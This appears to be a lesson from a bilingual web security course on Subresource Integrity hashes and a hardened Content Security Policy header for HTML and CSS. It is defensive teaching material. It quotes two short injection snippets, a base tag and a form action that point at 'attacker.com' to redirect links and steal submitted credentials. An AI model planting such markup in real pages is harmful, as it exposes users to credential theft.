# 07 - Subresource Integrity (SRI) & Content Security Policy (CSP)

> 🌐 **Language / اللغة:** [English 🇬🇧](./07-subresource-integrity-and-csp-foundations.md) | [العربية 🇸🇦](../ar/07-subresource-integrity-and-csp-foundations.md)

---

## 📌 1. The Supply Chain Risk: CDN Compromise

Modern web applications frequently load third-party stylesheets and scripts from public Content Delivery Networks (CDNs) like Cloudflare, Google Fonts, or unpkg.

```html
<link rel="stylesheet" href="https://cdn.example.com/styles.css">
```

### The Threat:
What if the CDN provider is breached, a rogue employee tampers with the file, or a DNS hijack redirects traffic? The malicious payload automatically runs inside the browsers of all your users!

---

## 🔒 2. Subresource Integrity (SRI)

**Subresource Integrity (SRI)** is a security standard that enables browsers to cryptographically verify that fetched external resources (scripts and stylesheets) have not been tampered with or modified unexpectedly:

```html
<link rel="stylesheet" 
      href="https://cdn.jsdelivr.net/npm/normalize.css@8.0.1/normalize.css" 
      integrity="sha256-WAgYcAck1C1/zEl5P9BkTWnTz02J869f214Ckvypz0E=" 
      crossorigin="anonymous">
```

### The Mechanics:
1. You generate a cryptographic base64 hash (`sha256`, `sha384`, or `sha512`) of the exact file contents.
2. You append the hash to the tag using `integrity="..."` and add `crossorigin="anonymous"`.
3. The browser downloads the file, recalculates its cryptographic hash locally, and compares it to the `integrity` attribute.
4. **If even a single byte differs**, the browser immediately blocks and discards the file, logging a security error in the console!

---

## 🛡️ 3. Content Security Policy (CSP) Directives for HTML & CSS

A properly configured **Content Security Policy (CSP)** is the ultimate defense against XSS, Dangling Markup, CSS Exfiltration, and Clickjacking.

### High-Assurance Recommended Baseline Header:
```http
Content-Security-Policy: 
    default-src 'self';
    script-src 'self';
    style-src 'self';
    img-src 'self';
    font-src 'self';
    frame-ancestors 'none';
    form-action 'self';
    base-uri 'self';
```

### Deconstructing HTML/CSS Directives:
- **`style-src 'self'`:** Disallows raw `<style>` tags and inline `style="..."` attributes (kills CSS data exfiltration vectors!).
- **`frame-ancestors 'none'`:** Completely neutralizes Clickjacking by forbidding any site from embedding your page in an `<iframe>`.
- **`base-uri 'self'`:** Prevents **Base Tag Injection** (`<base href="https://attacker.com">`), where an attacker re-roots all relative links and forms to their server!
- **`form-action 'self'`:** Blocks attackers from injecting `<form action="https://attacker.com">` to steal submitted credentials.

---

## 🎯 Summary & Lesson Challenge

- Use SRI hashes on all external CDN stylesheets and scripts.
- Disallow `'unsafe-inline'` in `style-src` and `script-src`.
- Harden forms and anchors with `form-action 'self'` and `base-uri 'self'`.

**Challenge:** Generate an SRI hash for a local CSS file using openssl or `shasum`, embed it in an HTML document with `integrity="sha256-..."`, then alter a single character in the CSS file and observe the browser block it.

---

**Next Lesson:**  
➡️ [Lesson 08: Defensive HTML & CSS Hardening Checklist](./08-defensive-html-and-css-hardening.md) | ⬅️ [Lesson 06: CSS Data Exfiltration](./06-css-data-exfiltration.md)
